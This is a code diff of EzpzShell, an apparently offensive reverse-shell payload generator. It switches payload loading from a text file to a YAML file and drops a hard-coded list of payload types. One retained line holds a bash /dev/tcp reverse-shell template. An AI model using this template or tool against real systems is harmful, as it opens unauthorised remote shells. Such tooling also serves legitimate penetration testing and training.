@@ -9,7 +9,7 @@
 #Github Link    : https://github.com/H0j3n/EzpzShell
 ######################################################################
 
-import sys,re,os,base64,pickle,string,random
+import sys,re,os,base64,pickle,string,random,yaml
 import netifaces as ni
 import urllib.parse
 from netifaces import AF_INET, AF_INET6, AF_LINK, AF_PACKET, AF_BRIDGE
@@ -49,11 +49,12 @@ def header():
 \n{colors.CYAN}-------- [{colors.RESET} USAGE {colors.CYAN}] --------
 {colors.RESET}{colors.ORANGE}\npython3 {sys.argv[0].split("/")[-1]} 10.10.10.10 9001 py\n{colors.ORANGE}python3 {sys.argv[0].split("/")[-1]} tun0 9001 py{colors.RESET}''')
 
-def load_shell():
-	listShell = open("/".join(str(sys.argv[0]).split("/")[:-1])+"/shell.txt").read()
-	for counter,i in enumerate(str(listShell).split("#INDEX")[1:]):
-		for j in i.split("#EXAMPLE")[1:]:
-			payload[list(payload.keys())[counter]].append(j)
+
+#def load_shell():
+#	listShell = open("shell.txt").read()
+#	for counter,i in enumerate(str(listShell).split("#INDEX")[1:]):
+#		for j in i.split("#EXAMPLE")[1:]:
+#			payload[list(payload.keys())[counter]].append(j)
 
 def base64gen(ip,port):
 	temp = 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'.replace("{IP}",ip).replace("{PORT}",port)
@@ -126,49 +127,20 @@ def get_random_string():
 	result_str = ''.join(random.choice(letters) for i in range(20))
 	return result_str
 
-payload = {
-	"py":[],
-	"py3":[],
-	"bash":[],
-	"c":[],
-	"nc":[],
-	"php":[],
-	"perl":[],
-	"ruby":[],
-	"haskell":[],
-	"powershell":[],
-	"node":[],
-	"awk":[],
-	"ncat":[],
-	"msf_exe":[],
-	"ssti":[],
-	"cgibin":[],
-	"jenkins":[],
-	"tarpriv":[],
-	"pickle":[],
-	"java":[],
-	"lua":[],
-	"asp": [],
-	"xxe": [],
-	"jsp":[],
-	"c#":[],
-        "xsl":[],
-        "yaml":[],
-        "sql":[],
-        "wordpress":[],
-        "json.net":[],
-        "msf_raw":[],
-        "msf_dll":[],
-        "msf_elf":[],
-        "dag":[],
-        "firebird":[],
-}
+# Load variables from updates.yaml
+if len(sys.argv[0].split("/")) > 1:
+	paths = "/".join(sys.argv[0].split("/")[:-1])+"/"
+else:
+	paths = ""
+#/opt/Tools/EzpzShell/ezpzShell.py
+parsed_yaml_file = yaml.load(open(paths+"updates.yaml"),Loader=yaml.FullLoader)
+payload = parsed_yaml_file["payload"]
 
 if __name__ == "__main__":
 	if len(sys.argv) < 4:
 		header()
 		sys.exit(-1)
-	load_shell()
+	#load_shell()
 	options = sys.argv[3]
 	port = sys.argv[2]
 	ip = ""
